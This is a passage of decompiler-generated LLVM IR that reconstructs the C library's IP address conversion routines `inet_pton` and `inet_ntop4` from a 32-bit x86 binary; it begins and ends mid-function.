  %v0_8053cc4 = load i32, i32* @eax, align 4
  %v3_8053ccd = bitcast i32* %stack_var_-20 to i16*
  %v4_8053ccd = call i32 @memcpy(i16* %v3_8053ccd, i32 4, i32 %v0_8053cc4)
  %v0_8053cd7 = load i32, i32* @esp, align 4
  %v6_8053cd7 = icmp eq i32 %v0_8053cd7, -16
  store i1 %v6_8053cd7, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8053cde

dec_label_pc_8053cdc:                             ; preds = %dec_label_pc_8053cac, %dec_label_pc_8053ca8, %dec_label_pc_8053ca3, %dec_label_pc_8053c99, %dec_label_pc_8053c82, %dec_label_pc_8053cbf
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8053cde.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053cde

dec_label_pc_8053cde:                             ; preds = %dec_label_pc_8053cc4, %dec_label_pc_8053cdc
  %v0_8053cde = phi i32 [ %v15_8053c6c, %dec_label_pc_8053cc4 ], [ %v0_8053cde.pre, %dec_label_pc_8053cdc ]
  %v0_8053ce5 = phi i32 [ 1, %dec_label_pc_8053cc4 ], [ 0, %dec_label_pc_8053cdc ]
  %v9_8053cde = icmp eq i32 %v0_8053cde, -28
  store i1 %v9_8053cde, i1* %zf.global-to-local, align 1
  %v2_8053ce1 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053ce1, i32* @ebx, align 4
  store i32 %v0_8053c66, i32* @esi, align 4
  ret i32 %v0_8053ce5

; uselistorder directives
  uselistorder i32 %v0_8053cbf, { 1, 0 }
  uselistorder i32 %v3_8053cb7, { 1, 0 }
  uselistorder i8 %v2_8053cb7, { 1, 2, 0 }
  uselistorder i1 %v9_8053cac, { 1, 0 }
  uselistorder i32 %v1_8053c9a, { 1, 0 }
  uselistorder i32 %v3_8053c88, { 1, 2, 0, 3 }
  uselistorder i8 %v2_8053cb722, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8053cde, { 1, 0 }
  uselistorder label %dec_label_pc_8053cdc, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8053c7a, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053ce6 = load i32, i32* @ebp, align 4
  %v0_8053ce7 = load i32, i32* @edi, align 4
  %v0_8053ce8 = load i32, i32* @esi, align 4
  %v0_8053ce9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8053cf1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8053cf1, i32* @edi, align 4
  %v9_8053cf5 = icmp eq i32 %arg1, 2
  br i1 %v9_8053cf5, label %dec_label_pc_8053d05, label %dec_label_pc_8053cfa

dec_label_pc_8053cfa:                             ; preds = %entry
  %v9_8053cfa = icmp eq i32 %arg1, 10
  %v1_8053cfd = icmp eq i1 %v9_8053cfa, false
  br i1 %v1_8053cfd, label %dec_label_pc_8053e96, label %dec_label_pc_8053d15

dec_label_pc_8053d05:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8053cf1, i32* @eax, align 4
  %v3_8053d0b = call i32 @inet_pton4(i32 %v0_8053ce9, i32 %v0_8053ce8, i32 %v0_8053ce7)
  store i32 %v3_8053d0b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ea8

dec_label_pc_8053d15:                             ; preds = %dec_label_pc_8053cfa
  %v2_8053d1a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053d1a, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_8053d1f = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_8053d1f, i32* @ebx, align 4
  %v2_8053d26 = add i32 %v5_8053d1f, 16
  store i32 %v2_8053d26, i32* %eax.global-to-local, align 4
  %v0_8053d30 = load i32, i32* @edi, align 4
  %v1_8053d30 = inttoptr i32 %v0_8053d30 to i8*
  %v2_8053d30 = load i8, i8* %v1_8053d30, align 1
  %v11_8053d30 = icmp eq i8 %v2_8053d30, 58
  %v1_8053d33 = icmp eq i1 %v11_8053d30, false
  br i1 %v1_8053d33, label %dec_label_pc_8053dc6, label %dec_label_pc_8053d35

dec_label_pc_8053d35:                             ; preds = %dec_label_pc_8053d15
  %v1_8053d35 = add i32 %v0_8053d30, 1
  store i32 %v1_8053d35, i32* @edi, align 4
  %v1_8053d36 = inttoptr i32 %v1_8053d35 to i8*
  %v2_8053d36 = load i8, i8* %v1_8053d36, align 1
  %v11_8053d36 = icmp eq i8 %v2_8053d36, 58
  %v1_8053d39 = icmp eq i1 %v11_8053d36, false
  br i1 %v1_8053d39, label %dec_label_pc_8053ea6, label %dec_label_pc_8053dc6

dec_label_pc_8053d4d:                             ; preds = %dec_label_pc_8053e06
  %v0_8053d4e = load i32, i32* @edi, align 4
  %v1_8053d4e = add i32 %v0_8053d4e, 1
  store i32 %v1_8053d4e, i32* @edi, align 4
  %v4_8053d56 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8058634.255, i32 0, i32 0), i32 %v2_8053e0d)
  store i32 %v4_8053d56, i32* %eax.global-to-local, align 4
  %v1_8053d5e = icmp eq i32 %v4_8053d56, 0
  br i1 %v1_8053d5e, label %dec_label_pc_8053d7d, label %dec_label_pc_8053d62

dec_label_pc_8053d62:                             ; preds = %dec_label_pc_8053d4d
  %v0_8053d62 = load i32, i32* @ebp, align 4
  %v2_8053d62 = mul i32 %v0_8053d62, 16
  %v1_8053d65 = add i32 %v4_8053d56, -134579764
  store i32 %v1_8053d65, i32* %eax.global-to-local, align 4
  %v2_8053d6a = or i32 %v2_8053d62, %v1_8053d65
  store i32 %v2_8053d6a, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8053d6a, 65536
  br i1 %tmp, label %dec_label_pc_8053d62.dec_label_pc_8053e06.outer_crit_edge, label %dec_label_pc_8053ea6

dec_label_pc_8053d62.dec_label_pc_8053e06.outer_crit_edge: ; preds = %dec_label_pc_8053d62
  %v0_8053e06.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053e06.outer

dec_label_pc_8053e06.outer:                       ; preds = %dec_label_pc_8053d62.dec_label_pc_8053e06.outer_crit_edge, %dec_label_pc_8053dc6
  %v0_8053e06.pre = phi i32 [ %v0_8053e06.pre.pre, %dec_label_pc_8053d62.dec_label_pc_8053e06.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_8053dc6 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053d62.dec_label_pc_8053e06.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_8053dc6 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8053d62.dec_label_pc_8053e06.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_8053dc6 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8053d62.dec_label_pc_8053e06.outer_crit_edge ], [ 0, %dec_label_pc_8053dc6 ]
  %v4_8053d82 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8053d87 = icmp eq i1 %v4_8053d82, false
  br label %dec_label_pc_8053e06

dec_label_pc_8053d7d:                             ; preds = %dec_label_pc_8053d4d
  %v0_8053d7d = load i32, i32* @esi, align 4
  %v9_8053d7d = icmp eq i32 %v0_8053d7d, 58
  %v1_8053d80 = icmp eq i1 %v9_8053d7d, false
  br i1 %v1_8053d80, label %dec_label_pc_8053dd2, label %dec_label_pc_8053d82

dec_label_pc_8053d82:                             ; preds = %dec_label_pc_8053d7d
  br i1 %v1_8053d87, label %dec_label_pc_8053d9e, label %dec_label_pc_8053d89

dec_label_pc_8053d89:                             ; preds = %dec_label_pc_8053d82
  %v5_8053d89 = icmp eq i8* %stack_var_-44.1, null
  %v1_8053d8e = icmp eq i1 %v5_8053d89, false
  br i1 %v1_8053d8e, label %dec_label_pc_8053ea6, label %dec_label_pc_8053d94

dec_label_pc_8053d94:                             ; preds = %dec_label_pc_8053d89
  %v0_8053d94 = load i32, i32* @ebx, align 4
  %v5_8053d94 = inttoptr i32 %v0_8053d94 to i8*
  %v0_8053d98 = load i32, i32* @edi, align 4
  %v5_8053d98 = inttoptr i32 %v0_8053d98 to i8*
  br label %dec_label_pc_8053e06

dec_label_pc_8053d9e:                             ; preds = %dec_label_pc_8053d82
  %v0_8053d9e = load i32, i32* @edi, align 4
  %v1_8053d9e = inttoptr i32 %v0_8053d9e to i8*
  %v2_8053d9e = load i8, i8* %v1_8053d9e, align 1
  %v3_8053d9e = icmp eq i8 %v2_8053d9e, 0
  br i1 %v3_8053d9e, label %dec_label_pc_8053ea6, label %dec_label_pc_8053da7

dec_label_pc_8053da7:                             ; preds = %dec_label_pc_8053d9e
  %v0_8053da7 = load i32, i32* @ebx, align 4
  %v1_8053da7 = add i32 %v0_8053da7, 2
  store i32 %v1_8053da7, i32* @edx, align 4
  %v6_8053dae = icmp ugt i32 %v1_8053da7, %v2_8053d26
  br i1 %v6_8053dae, label %dec_label_pc_8053ea6, label %dec_label_pc_8053db4

dec_label_pc_8053db4:                             ; preds = %dec_label_pc_8053da7
  %v0_8053db4 = load i32, i32* @ebp, align 4
  %v2_8053db6 = udiv i32 %v0_8053db4, 256
  %v4_8053db6 = trunc i32 %v2_8053db6 to i8
  %v3_8053db9 = inttoptr i32 %v0_8053da7 to i8*
  store i8 %v4_8053db6, i8* %v3_8053db9, align 1
  %v0_8053dbb = load i32, i32* @ebp, align 4
  store i32 %v0_8053dbb, i32* %eax.global-to-local, align 4
  %v1_8053dbd = trunc i32 %v0_8053dbb to i8
  %v2_8053dbd = load i32, i32* @ebx, align 4
  %v3_8053dbd = add i32 %v2_8053dbd, 1
  %v4_8053dbd = inttoptr i32 %v3_8053dbd to i8*
  store i8 %v1_8053dbd, i8* %v4_8053dbd, align 1
  %v0_8053dc0 = load i32, i32* @edx, align 4
  store i32 %v0_8053dc0, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053dc6

dec_label_pc_8053dc6:                             ; preds = %dec_label_pc_8053d15, %dec_label_pc_8053d35, %dec_label_pc_8053db4
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8053db4 ], [ %v1_8053d35, %dec_label_pc_8053d35 ], [ %v0_8053d30, %dec_label_pc_8053d15 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053db4 ], [ null, %dec_label_pc_8053d35 ], [ null, %dec_label_pc_8053d15 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8053e06.outer

dec_label_pc_8053dd2:                             ; preds = %dec_label_pc_8053d7d
  %v9_8053dd2 = icmp eq i32 %v0_8053d7d, 46
  %v1_8053dd5 = icmp eq i1 %v9_8053dd2, false
  br i1 %v1_8053dd5, label %dec_label_pc_8053ea6, label %dec_label_pc_8053ddb

dec_label_pc_8053ddb:                             ; preds = %dec_label_pc_8053dd2
  %v0_8053ddb = load i32, i32* @ebx, align 4
  %v1_8053ddb = add i32 %v0_8053ddb, 4
  store i32 %v1_8053ddb, i32* @esi, align 4
  %v6_8053de2 = icmp ugt i32 %v1_8053ddb, %v2_8053d26
  br i1 %v6_8053de2, label %dec_label_pc_8053ea6, label %dec_label_pc_8053de8

dec_label_pc_8053de8:                             ; preds = %dec_label_pc_8053ddb
  %v4_8053de8 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8053de8, i32* @eax, align 4
  store i32 %v0_8053ddb, i32* @edx, align 4
  store i32 %v1_8053ddb, i32* @ebx, align 4
  %v2_8053df0 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053df0 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8053df0, i32 %v2_8053d26)
  store i32 %v5_8053df0, i32* %eax.global-to-local, align 4
  %tmp62 = icmp slt i32 %v5_8053df0, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_8053e3d, label %dec_label_pc_8053ea6

dec_label_pc_8053e06:                             ; preds = %dec_label_pc_8053e06.outer, %dec_label_pc_8053d94
  %v0_8053e06 = phi i32 [ %v0_8053d98, %dec_label_pc_8053d94 ], [ %v0_8053e06.pre, %dec_label_pc_8053e06.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8053d94, %dec_label_pc_8053d94 ], [ %stack_var_-44.1.ph, %dec_label_pc_8053e06.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8053d98, %dec_label_pc_8053d94 ], [ %stack_var_-36.1.ph, %dec_label_pc_8053e06.outer ]
  %v1_8053e06 = inttoptr i32 %v0_8053e06 to i8*
  %v2_8053e06 = load i8, i8* %v1_8053e06, align 1
  %v3_8053e06 = sext i8 %v2_8053e06 to i32
  store i32 %v3_8053e06, i32* %eax.global-to-local, align 4
  %v2_8053e0d = call i32 @__GI_tolower(i32 %v3_8053e06)
  store i32 %v2_8053e0d, i32* %eax.global-to-local, align 4
  %v1_8053e15 = icmp eq i32 %v2_8053e0d, 0
  store i32 %v2_8053e0d, i32* @esi, align 4
  %v1_8053e19 = icmp eq i1 %v1_8053e15, false
  br i1 %v1_8053e19, label %dec_label_pc_8053d4d, label %dec_label_pc_8053e1f

dec_label_pc_8053e1f:                             ; preds = %dec_label_pc_8053e06
  br i1 %v4_8053d82, label %dec_label_pc_8053e3d, label %dec_label_pc_8053e26

dec_label_pc_8053e26:                             ; preds = %dec_label_pc_8053e1f
  %v0_8053e26 = load i32, i32* @ebx, align 4
  %v1_8053e26 = add i32 %v0_8053e26, 2
  store i32 %v1_8053e26, i32* @edx, align 4
  %v6_8053e2d = icmp ugt i32 %v1_8053e26, %v2_8053d26
  br i1 %v6_8053e2d, label %dec_label_pc_8053ea6, label %dec_label_pc_8053e2f

dec_label_pc_8053e2f:                             ; preds = %dec_label_pc_8053e26
  %v0_8053e2f = load i32, i32* @ebp, align 4
  %v2_8053e31 = udiv i32 %v0_8053e2f, 256
  %v4_8053e31 = trunc i32 %v2_8053e31 to i8
  %v3_8053e34 = inttoptr i32 %v0_8053e26 to i8*
  store i8 %v4_8053e31, i8* %v3_8053e34, align 1
  %v0_8053e36 = load i32, i32* @ebp, align 4
  store i32 %v0_8053e36, i32* %eax.global-to-local, align 4
  %v1_8053e38 = trunc i32 %v0_8053e36 to i8
  %v2_8053e38 = load i32, i32* @ebx, align 4
  %v3_8053e38 = add i32 %v2_8053e38, 1
  %v4_8053e38 = inttoptr i32 %v3_8053e38 to i8*
  store i8 %v1_8053e38, i8* %v4_8053e38, align 1
  %v0_8053e3b = load i32, i32* @edx, align 4
  store i32 %v0_8053e3b, i32* @ebx, align 4
  br label %dec_label_pc_8053e3d

dec_label_pc_8053e3d:                             ; preds = %dec_label_pc_8053e1f, %dec_label_pc_8053de8, %dec_label_pc_8053e2f
  %v4_8053e3d = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053e3d = icmp eq i8* %stack_var_-44.1, null
  %v0_8053e75.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8053e3d, label %dec_label_pc_8053e75, label %dec_label_pc_8053e44

dec_label_pc_8053e44:                             ; preds = %dec_label_pc_8053e3d
  store i32 1, i32* @esi, align 4
  %v6_8053e4b = sub i32 %v0_8053e75.pre, %v4_8053e3d
  store i32 %v6_8053e4b, i32* @edi, align 4
  %v16_8053e4f = icmp eq i32 %v0_8053e75.pre, %v2_8053d26
  %v1_8053e53 = icmp eq i1 %v16_8053e4f, false
  br i1 %v1_8053e53, label %dec_label_pc_8053e6d.preheader, label %dec_label_pc_8053ea6

dec_label_pc_8053e6d.preheader:                   ; preds = %dec_label_pc_8053e44
  %v3_8053e6d89 = inttoptr i32 %v6_8053e4b to i8*
  %v9_8053e6f98 = icmp slt i8* %v3_8053e6d89, inttoptr (i32 1 to i8*)
  br i1 %v9_8053e6f98, label %dec_label_pc_8053e71, label %dec_label_pc_8053e57

dec_label_pc_8053e57:                             ; preds = %dec_label_pc_8053e6d.preheader, %dec_label_pc_8053e57
  %v0_8053e65100 = phi i32 [ %v0_8053e6d.pre, %dec_label_pc_8053e57 ], [ 1, %dec_label_pc_8053e6d.preheader ]
  %v0_8053e5799 = phi i32 [ %v1_8053e6d.pre, %dec_label_pc_8053e57 ], [ %v6_8053e4b, %dec_label_pc_8053e6d.preheader ]
  %v2_8053e5d = sub i32 %v0_8053e5799, %v0_8053e65100
  %v6_8053e5f = add i32 %v2_8053e5d, %v4_8053e3d
  store i32 %v6_8053e5f, i32* %eax.global-to-local, align 4
  %v2_8053e63 = sub i32 %v2_8053d26, %v0_8053e65100
  store i32 %v2_8053e63, i32* @ecx, align 4
  %v1_8053e65 = add i32 %v0_8053e65100, 1
  store i32 %v1_8053e65, i32* @esi, align 4
  %v1_8053e66 = inttoptr i32 %v6_8053e5f to i8*
  %v2_8053e66 = load i8, i8* %v1_8053e66, align 1
  %v3_8053e66 = zext i8 %v2_8053e66 to i32
  %v4_8053e66 = load i32, i32* @edx, align 4
  %v5_8053e66 = and i32 %v4_8053e66, -256
  %v6_8053e66 = or i32 %v5_8053e66, %v3_8053e66
  store i32 %v6_8053e66, i32* @edx, align 4
  %v3_8053e68 = inttoptr i32 %v2_8053e63 to i8*
  store i8 %v2_8053e66, i8* %v3_8053e68, align 1
  %v0_8053e6a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e6a = inttoptr i32 %v0_8053e6a to i8*
  store i8 0, i8* %v1_8053e6a, align 1
  %v0_8053e6d.pre = load i32, i32* @esi, align 4
  %v1_8053e6d.pre = load i32, i32* @edi, align 4
  %v2_8053e6d = inttoptr i32 %v0_8053e6d.pre to i8*
  %v3_8053e6d = inttoptr i32 %v1_8053e6d.pre to i8*
  %v9_8053e6f = icmp sgt i8* %v2_8053e6d, %v3_8053e6d
  br i1 %v9_8053e6f, label %dec_label_pc_8053e71, label %dec_label_pc_8053e57

dec_label_pc_8053e71:                             ; preds = %dec_label_pc_8053e57, %dec_label_pc_8053e6d.preheader
  br label %dec_label_pc_8053e75

dec_label_pc_8053e75:                             ; preds = %dec_label_pc_8053e3d, %dec_label_pc_8053e71
  %v0_8053e75 = phi i32 [ %v2_8053d26, %dec_label_pc_8053e71 ], [ %v0_8053e75.pre, %dec_label_pc_8053e3d ]
  %v16_8053e75 = icmp eq i32 %v0_8053e75, %v2_8053d26
  %v1_8053e79 = icmp eq i1 %v16_8053e75, false
  br i1 %v1_8053e79, label %dec_label_pc_8053ea6, label %dec_label_pc_8053e7b

dec_label_pc_8053e7b:                             ; preds = %dec_label_pc_8053e75
  store i32 %v2_8053d1a, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_8053e87 = call i32 @memcpy(i16* %tmp64, i32 %v2_8053d1a, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ea8

dec_label_pc_8053e96:                             ; preds = %dec_label_pc_8053cfa
  %v1_8053e96 = call i32 @__errno_location(i32 %v0_8053ce9)
  %v1_8053e9b = inttoptr i32 %v1_8053e96 to i32*
  store i32 97, i32* %v1_8053e9b, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ea8

dec_label_pc_8053ea6:                             ; preds = %dec_label_pc_8053da7, %dec_label_pc_8053d9e, %dec_label_pc_8053d62, %dec_label_pc_8053d89, %dec_label_pc_8053e44, %dec_label_pc_8053de8, %dec_label_pc_8053e75, %dec_label_pc_8053e26, %dec_label_pc_8053ddb, %dec_label_pc_8053dd2, %dec_label_pc_8053d35
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ea8

dec_label_pc_8053ea8:                             ; preds = %dec_label_pc_8053e96, %dec_label_pc_8053e7b, %dec_label_pc_8053d05, %dec_label_pc_8053ea6
  %v0_8053eaf = phi i32 [ -1, %dec_label_pc_8053e96 ], [ 1, %dec_label_pc_8053e7b ], [ %v3_8053d0b, %dec_label_pc_8053d05 ], [ 0, %dec_label_pc_8053ea6 ]
  store i32 %v0_8053ce9, i32* @ebx, align 4
  store i32 %v0_8053ce8, i32* @esi, align 4
  store i32 %v0_8053ce7, i32* @edi, align 4
  store i32 %v0_8053ce6, i32* @ebp, align 4
  ret i32 %v0_8053eaf

; uselistorder directives
  uselistorder i32 %v1_8053e6d.pre, { 1, 0 }
  uselistorder i32 %v0_8053e6d.pre, { 1, 0 }
  uselistorder i32 %v0_8053e65100, { 2, 1, 0 }
  uselistorder i32 %v0_8053e75.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8053e0d, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8053d26, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8053ce9, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8053ea8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053ea6, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8053e75, { 1, 0 }
  uselistorder label %dec_label_pc_8053e57, { 1, 0 }
  uselistorder label %dec_label_pc_8053e3d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053e06, { 1, 0 }
  uselistorder label %dec_label_pc_8053dc6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053e06.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_8053eb1 = load i32, i32* @edi, align 4
  %v0_8053eb2 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_8053eb6 = ptrtoint i32* %stack_var_-76 to i32
  %v0_8053eb9 = load i32, i32* @eax, align 4
  %v3_8053ebd = and i32 %v0_8053eb9, -65536
  %v2_8053ec3 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_8053ec8 = load i32, i32* @edx, align 4
  %v5_8053ec8 = inttoptr i32 %v0_8053ec8 to i8*
  store i8* %v5_8053ec8, i8** %stack_var_-56, align 4
  %v0_8053ecc = load i32, i32* @ecx, align 4
  store i32 %v3_8053ebd, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8053ed7 = add i32 %v2_8053ec3, 4
  store i32 %v6_8053ed7, i32* %edi.global-to-local, align 4
  %v2_8053ed8 = inttoptr i32 %v6_8053ed7 to i32*
  store i32 0, i32* %v2_8053ed8, align 4
  %v3_8053ed8 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053ed8 = add i32 %v3_8053ed8, 4
  store i32 %v6_8053ed8, i32* %edi.global-to-local, align 4
  %v0_8053ed9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053ed9 = inttoptr i32 %v6_8053ed8 to i32*
  store i32 %v0_8053ed9, i32* %v2_8053ed9, align 4
  %v3_8053ed9 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053ed9 = add i32 %v3_8053ed9, 4
  store i32 %v6_8053ed9, i32* %edi.global-to-local, align 4
  %v0_8053eda = load i32, i32* %eax.global-to-local, align 4
  %v1_8053eda = trunc i32 %v0_8053eda to i16
  %v3_8053eda = inttoptr i32 %v6_8053ed9 to i16*
  store i16 %v1_8053eda, i16* %v3_8053eda, align 2
  %v4_8053eda = load i32, i32* %edi.global-to-local, align 4
  %v7_8053eda = add i32 %v4_8053eda, 2
  %v0_8053edc = load i32, i32* %eax.global-to-local, align 4
  %v1_8053edc = trunc i32 %v0_8053edc to i8
  %v3_8053edc = inttoptr i32 %v7_8053eda to i8*
  store i8 %v1_8053edc, i8* %v3_8053edc, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_8053f7730 = load i32, i32* @esi, align 4
  %v10_8053f7736 = icmp eq i32 %v0_8053f7730, 3
  store i1 %v10_8053f7736, i1* %zf.global-to-local, align 1
  %v7_8053f7a38 = icmp sgt i32 %v0_8053f7730, 3
  br i1 %v7_8053f7a38, label %dec_label_pc_8053f80, label %dec_label_pc_8053ee4

dec_label_pc_8053ee4:                             ; preds = %dec_label_pc_8053f57, %entry
  %v3_8053efa = phi i32 [ 0, %entry ], [ %v1_8053f80.pre, %dec_label_pc_8053f57 ]
  %v0_8053f7739 = phi i32 [ %v0_8053f7730, %entry ], [ %v0_8053f77, %dec_label_pc_8053f57 ]
  %v2_8053eea = add i32 %v0_8053f7739, %v0_8053eb9
  %v12_8053eea = icmp eq i32 %v2_8053eea, 0
  store i1 %v12_8053eea, i1* %zf.global-to-local, align 1
  store i32 %v2_8053eea, i32* %ebp.global-to-local, align 4
  %v1_8053eec = inttoptr i32 %v2_8053eea to i8*
  %v2_8053eec = load i8, i8* %v1_8053eec, align 1
  %v3_8053eec = zext i8 %v2_8053eec to i32
  %v4_8053eec = load i32, i32* @edx, align 4
  %v5_8053eec = and i32 %v4_8053eec, -65536
  %v6_8053eec = or i32 %v5_8053eec, %v3_8053eec
  store i32 %v6_8053eec, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_8053eec, 100
  %v6_8053ef3 = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_8053eec, 100
  %v12_8053ef3 = zext i8 %tmp24 to i32
  %v14_8053ef3 = mul nuw nsw i32 %v12_8053ef3, 256
  %v15_8053ef3 = or i32 %v6_8053ef3, %v5_8053eec
  %v16_8053ef3 = or i32 %v15_8053ef3, %v14_8053ef3
  store i32 %v16_8053ef3, i32* %eax.global-to-local, align 4
  %v2_8053ef7 = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8053efa = load i32, i32* @esp, align 4
  %v4_8053efa = add i32 %v2_8053efa, 43
  %v5_8053efa = add i32 %v4_8053efa, %v3_8053efa
  %v6_8053efa = inttoptr i32 %v5_8053efa to i8*
  store i8 %v2_8053ef7, i8* %v6_8053efa, align 1
  %v0_8053efe = load i32, i32* %edi.global-to-local, align 4
  %v1_8053efe = add i32 %v0_8053efe, 1
  store i32 %v0_8053efe, i32* @ecx, align 4
  %v0_8053f07 = load i32, i32* @esp, align 4
  %v2_8053f07 = add i32 %v0_8053efe, 43
  %v3_8053f07 = add i32 %v2_8053f07, %v0_8053f07
  %v4_8053f07 = inttoptr i32 %v3_8053f07 to i8*
  %v5_8053f07 = load i8, i8* %v4_8053f07, align 1
  %v11_8053f07 = icmp eq i8 %v5_8053f07, 48
  store i1 %v11_8053f07, i1* %zf.global-to-local, align 1
  %v1_8053f0c = icmp eq i1 %v11_8053f07, false
  %v0_8053f36 = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8053f0c, label %dec_label_pc_8053f34, label %dec_label_pc_8053f0e

dec_label_pc_8053f0e:                             ; preds = %dec_label_pc_8053ee4
  %v3_8053f12 = trunc i32 %v0_8053f36 to i16
  %v5_8053f12 = udiv i16 %v3_8053f12, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_8053f12, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8053f24 = trunc i16 %tmp42 to i8
  %v2_8053f24 = or i8 %v1_8053f24, 48
  %v12_8053f24 = zext i8 %v2_8053f24 to i32
  store i32 %v12_8053f24, i32* %eax.global-to-local, align 4
  %v7_8053f26 = icmp eq i8 %v1_8053f24, 0
  store i1 %v7_8053f26, i1* %zf.global-to-local, align 1
  store i8 %v2_8053f24, i8* %v4_8053f07, align 1
  %v0_8053f2c = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8053f2c, label %dec_label_pc_8053f57, label %dec_label_pc_8053f2e

dec_label_pc_8053f2e:                             ; preds = %dec_label_pc_8053f0e
  store i32 %v1_8053efe, i32* @ecx, align 4
  br label %dec_label_pc_8053f57

dec_label_pc_8053f34:                             ; preds = %dec_label_pc_8053ee4
  store i32 %v1_8053efe, i32* %ebx.global-to-local, align 4
  %v3_8053f3c = trunc i32 %v0_8053f36 to i16
  %v5_8053f3c = udiv i16 %v3_8053f3c, 10
  %tmp43 = urem i16 %v5_8053f3c, 256
